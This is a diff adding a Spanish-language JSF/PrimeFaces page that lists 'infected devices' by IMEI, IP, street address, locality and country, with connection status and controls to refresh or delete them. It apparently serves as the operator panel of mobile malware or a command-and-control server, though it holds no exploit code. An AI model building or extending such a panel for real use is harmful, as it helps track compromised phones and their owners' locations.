@@ -1,0 +1,118 @@
+<?xml version='1.0' encoding='UTF-8' ?>
+<!DOCTYPE composition PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<ui:composition xmlns="http://www.w3.org/1999/xhtml"
+				xmlns:ui="http://java.sun.com/jsf/facelets"
+				xmlns:p="http://primefaces.org/ui"
+				xmlns:h="http://java.sun.com/jsf/html"
+				xmlns:f="http://java.sun.com/jsf/core"
+				template="../template/DefaultLayout.xhtml"
+				xmlns:pe="http://primefaces.org/ui/extensions"
+				xmlns:fn="http://java.sun.com/jsp/jstl/functions"
+				>
+
+	<ui:define name="contenido" style="background-color: blue">
+		<h:form id="id_form">
+	        <p:growl id="id_growl" showDetail="true" life="2000"  />
+	        		
+	        <p:tabView id="id_tab" dynamic="true" cache="true">
+				<p:tab   title="Dispositivos infectados">
+   					<div class="ui-g-12">
+   					
+   						<p:idleMonitor  timeout="1000" >
+       						<p:ajax event="active" update=":id_form:id_tab:id_table_device,:id_form:id_tab:id_update,:id_form:id_tab:id_delete"  />
+   						</p:idleMonitor>
+						<p:dataTable id="id_table_device" var="device" value="#{deviceManagedBean.listDevice}"
+							paginatorTemplate="{RowsPerPageDropdown} {CurrentPageReport} {FirstPageLink} {PreviousPageLink} {PageLinks} {NextPageLink} {LastPageLink} "
+							paginator="true" rows="15" rowsPerPageTemplate="15, 20, 25" style="margin-bottom:20px; font-size:80%;" emptyMessage="Lo sentimos, no se encuentra ningún dispositivo disponible para monitorizar. Espere a que algún dispositivo inicie la fase de establecimiento.">
+							
+							<f:facet name="header">
+								Listado de dispositivos infectados
+								<p:commandButton id="id_toggler" type="button" value="Columnas" style="float:right; height:30px;" icon="ui-icon-calculator" />
+        						<p:columnToggler datasource="id_table_device" trigger="id_toggler" /> 
+							</f:facet>
+			
+							<p:column headerText="Seleccionar"  width="45" style="text-align: center">
+					           	<p:commandButton  icon="ui-icon-plusthick" title="Seleccionar" update="id_form:id_growl" action="#{deviceManagedBean.selected()}">
+               						<f:setPropertyActionListener value="#{device}" target="#{deviceManagedBean.deviceSelected}" />
+               						<p:ajax update=":id_form_cabecera"></p:ajax>
+					            </p:commandButton>
+        					</p:column>
+        				
+							<p:column headerText="ID/IMEI" width="100">
+								<h:outputText value="#{device.imei}" />
+							</p:column>
+			
+							<p:column headerText="IP" width="100">
+								<h:outputText value="#{device.ip}" />
+							</p:column>
+							
+							<p:column headerText="Dirección" width="40%">
+								<h:outputText value="#{device.address}" />
+							</p:column>
+						
+							<p:column headerText="Localidad" width="30%">
+								<h:outputText value="#{device.locality}" />
+							</p:column>
+							
+							<p:column headerText="País" width="30%">
+								<h:outputText value="#{device.country}" />
+							</p:column>
+														
+							<p:column headerText="Última sincronización" width="120">
+								<h:outputText value="#{device.lastSynchronization}">
+									<f:convertDateTime pattern="MM/dd/yyyy hh:mm a" />
+								</h:outputText>
+							</p:column>
+							
+							<p:column headerText="Última conexion" width="120">
+								<h:outputText value="#{device.lastConnection}">
+									<f:convertDateTime pattern="MM/dd/yyyy hh:mm a" />
+								</h:outputText>
+							</p:column>
+							
+							<p:column headerText="Estado" width="25" style="text-align: center">
+								<p:graphicImage rendered="#{device.deviceState!=false}"   value="./../resources/image/ui_icon/device_true.gif"  width="35" height="35" />
+								<p:graphicImage rendered="#{device.deviceState!=true}"  value="./../resources/image/ui_icon/device_false.gif" width="15" height="15" />
+							</p:column>
+						
+							<p:column headerText="Detalles" width="30" style="text-align: center;">
+								<p:button outcome="device_detail" icon="ui-icon-search">
+									<f:param name="imei" value="#{device.imei}" />
+								</p:button>
+							</p:column>
+							
+							<f:facet name="footer">
+       							Registros totales: #{fn:length(deviceManagedBean.listDevice)}
+  						 	</f:facet>
+						</p:dataTable>
+					</div>
+				
+        		   	<div class="ui-g-12" align="right" style="margin-top:10px;">
+						<p:commandButton id="id_update" disabled="#{deviceManagedBean.listDevice.size() == 0}" value="Actualizar conexiones" action="#{deviceManagedBean.update()}" icon="fa fa-refresh" update=":id_form:id_tab:id_table_device,:id_form:id_growl" onstart="PF('blockUIWidget').block()" oncomplete="PF('blockUIWidget').unblock()"/>
+						<p:commandButton id="id_delete" value="Eliminar dispositivos" action="#{deviceManagedBean.deleteAllDevice()}" icon="ui-icon-cancel" disabled="#{deviceManagedBean.listDevice.size() == 0}" styleClass="buttonPF"  update=":id_form:id_growl,:id_form:id_tab:id_table_device" onstart="PF('blockUIWidget').block()" oncomplete="PF('blockUIWidget').unblock()"/> 	
+						<p:commandButton id="id_legend" styleClass="buttonPF" value="Leyenda" type="button" />
+					    <p:overlayPanel id="id_overlay_panel" for="id_legend" hideEffect="fade" showEvent="mouseover">
+					    	<h:panelGrid columns="2" >
+					    		<p:outputLabel for="id_sent" value="Conectado: " />
+					    		<h:graphicImage id="id_sent" value="./../resources/image/ui_icon/device_true.gif" width="35" height="35" />
+					    		<p:outputLabel for="id_imbox" value="Desconectado:" />
+					    		<p:columnGroup>
+									<p:spacer width="10" height="0" />
+					    			<h:graphicImage id="id_imbox" value="./../resources/image/ui_icon/device_false.gif" width="15" height="15" />
+					    		</p:columnGroup>
+					    	</h:panelGrid>
+					    </p:overlayPanel> 
+					</div>
+				
+        		</p:tab>
+        	</p:tabView>
+        		
+	    	<pe:blockUI widgetVar="blockUIWidget">  
+			    <h:panelGrid columns="2">  
+			        <h:graphicImage  value="./../resources/image/ui_icon/load.gif" height="150" />  
+			        <h:outputText value="Sincronizando dispositivos..." style="white-space: nowrap;"/>  
+			    </h:panelGrid>  
+			</pe:blockUI>
+        </h:form>
+	</ui:define>
+</ui:composition>
